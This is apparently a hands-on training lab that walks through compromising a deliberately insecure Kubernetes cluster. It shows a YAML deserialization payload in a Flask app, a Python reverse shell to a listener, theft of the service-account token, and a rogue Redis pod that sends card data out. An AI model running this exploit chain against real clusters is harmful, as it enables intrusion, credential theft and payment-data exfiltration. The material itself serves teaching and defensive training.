## Attacking a K8s Cluster
---

#### **Lab Image : Kubernetes**

* Step 1: Navigate to the `K8s-Cluster-Attack` directory on the provisioned server.

```commandline
cd /root/container-training/Kubernetes/K8s-Cluster-Attack
```

### *As an alternative to `tmux`, you can open the lab session in another tab on the browser and repeat Step 1*

* Step 2: Multiplex terminal session with `tmux` and split panes horizontally.

```commandline
tmux
```
```commandline
tmux split-window -h
```

* Step 3: Setup the insecure cluster and start the flask stack to be run on the cluster. Wait for the command to complete.

```commandline
kubectl create clusterrolebinding badboy  --user system:anonymous --group system:unauthenticated --clusterrole cluster-admin --serviceaccount=default:default
```
```commandline
./setup_flask_stack.sh
```

* Step 4: Verify that the flask stack is running and make sure the `Status` is `Running`

```commandline
kubectl get pods
```

* Step 5: Check for running services. You should see `ngflask-redis-service` and its `ClusterIP`. 

```commandline
kubectl get svc
```

* Step 6: Set the URL of `ngflask-redis` as an Environment variable

```commandline
NGFLASK=http://$(kubectl get svc ngflask-redis-service -o yaml | grep "clusterIP" |awk '{print $2}')
```
```commandline
echo $NGFLASK
```

* Step 7: Check if the service is running correctly. It should respond with `Please POST JSON requests to this URL`.

```commandline
http GET $NGFLASK
```

* Step 8: Generate a few artifacts by creating transactions on the Application

```commandline
http GET $NGFLASK/generate
```

### *It should return with the following response*

### *`{"success": "10 transactions generated successfully"}`*


* Step 9: Check the latest transaction that has been logged by our app

```commandline
http GET $NGFLASK/status
```

### *It should come back with a response that looks similar to the one below*

```html
<html>
<head>
    <title>Latest Record</title>
</head>
<body>
  <h2>Latest Transaction Status</h2>

      <h3>amount: 430</h3>

      <h3>name: Cynthia Robinson</h3>

      <h3>card: ********9238</h3>

      <h3>expiration: 1227</h3>

      <h3>Status: Success</h3>
</body>
</html>
```

-------

### *Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉*

### *Exploiting a Deserialization Flaw*

#### *Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.*

#### *Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.*

* Step 10: Navigate to `payloads` directory that has malicious yaml files

```commandline
cd /root/container-training/Kubernetes/K8s-Cluster-Attack/payloads
```

* Step 11: Upload a malicious yaml file and identify the flaw

```commandline
http --form POST $NGFLASK/upload file@test_payment.yml
```

### *It should come back with a response similar to the one below*

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:35:30 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

* Step 11: Verify if the malicious transaction that was generated.

```commandline
http GET $NGFLASK/status
```

> **NOTE**: You should see a dump of all Environment variables on the container.


* Step 12: In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `<serverip>` with value of `serverip` fetched in the previous step.

```commandline
sed -i -e 's/Server_IP_Here/'"$(serverip)"'/g' reverse_shell.yml
```

* Step 13: Check the file to confirm the changes made

```commandline
cat reverse_shell.yml
```
**EXAMPLE**: `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"104.1.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`

* Step 14: Switch to the left pane of the terminal by running `ctrl` + `b` and then `left arrow key`.
    
    * If you're not using tmux, switch to the other tab on the browser

* Step 15: Start the `netcat` listener on port `1337`

```commandline
nc -l 1337
```

* Step 16: Go to the right pane of the terminal by running `ctrl` + `b` and then `right arrow key` 

    * If you're not using tmux, switch to the other tab on the browser

* Step 17: Post the malicious `reverse_shell.yml` file

```commandline
http --form POST $NGFLASK/upload file@reverse_shell.yml
```

### *It should come back with a response similar to the one below*

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:38:49 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

### *On the tab running netcat, you should have gotten a netcat reverse TCP shell! The output on the tab running `netcat` will be similar to the one below.*

```
nc -l 1337
/bin/sh: can't access tty; job control turned off
/app #
```

### *Now you can interact with your target app and backend K8s cluster*

> **NOTE**: Do NOT use the `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do `Step 19`

* Step 18: In the reverse shell, navigate within the pod to fetch `Service Account` token.


```commandline
cd /run/secrets/kubernetes.io/serviceaccount
```
```commandline
export TOKEN=$(cat token)
```

### *We are now going to masquerade with the cluster-admin's token.*

* Step 19: Start interacting with K8s API. To get a JSON dump of all pods running, run

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure
```

* Step 20: Fetch the `clusterIP` of `redis-service` and note the value. 

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure | grep -E '("redis-service"|clusterIP)'
```

### *The response will be similar to the one below. Please note that the IP may differ*

```
        "clusterIP": "10.96.0.1",
        "clusterIP": "10.98.196.52",
        "name": "redis-service",
        "clusterIP": "10.97.43.203", # This is the MASTERHOST IP of Redis
```

* Step 21: Get Server IP 

```commandline
serverip
```

* Step 22: Navigate to the reverse shell

* Step 23: On your machine, copy the following JSON value and make the following changes:
    
    * Change `Redis-Service-ClusterIP-HERE` with the value of redis-service `clusterIP`.
    
    * Change `SERVERIP-HERE` with that of Server IP that can be fetched by running `serverip`

```text
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              {
                "name": "MASTERHOST",
                "value": "Redis-Service-ClusterIP-HERE"
              },
              {
                "name": "MASTERPORT",
                "value": "6379"
              },
              {
                "name": "LISTENER_IP",
                "value": "SERVERIP-HERE"
              },
              {
                "name": "LISTENER_PORT",
                "value": "9090"
              }
            ]
        }]
    }
}
EOF
```


* Step 24: In the reverse shell, if the `pwd` is `/run/secrets/kubernetes.io/serviceaccount` you will have to navigate to the `tmp` directory. 

```commandline
pwd
```
```commandline
cd /tmp
```

### *root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`*

* Step 25: Copy the edited JSON from the previous step and paste it in `/tmp` directory.
**EXAMPLE**:
```bash
# Copy the JSON value you edited, please don't copy the one below
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              ... 
              ...
              ...
              ...
              }
            ]
        }]
    }
}
EOF
```

* Step 26: Check if `mal-redis.json` has been created in '/tmp/'

```commandline
ls
```

* Step 27: Create the `malicious-redis` pod

```commandline
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure
```

* Step 28: Switch to the right pane, navigate to the `K8s-Cluster-Attack` directory and setup the listener. `ctrl` + `b` + `(right arrow key)`

```commandline
cd /root/container-training/Kubernetes/K8s-Cluster-Attack
```
```commandline
python3 tornado_server.py
```

### *You should now see all the credit-card details being posted to the listener from the malicious redis pod*

#### *Teardown*:

* Step 1: Stop the listener with `ctrl` + `c`. Terminate the pods and services that were created

```commandline
cd /root/container-training/Kubernetes/K8s-Cluster-Attack
```
```commandline
kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
```

* Step 2: Check if other `pods` or `configmaps` are on the cluster and delete them

```commandline
kubectl get pods
```
```commandline
kubectl delete pod mal-redis
```
```commandline
kubectl delete configmap nginx-config
```

* Step 3: Exit from the tmux sessions

```commandline
exit
```
```commandline
exit
```
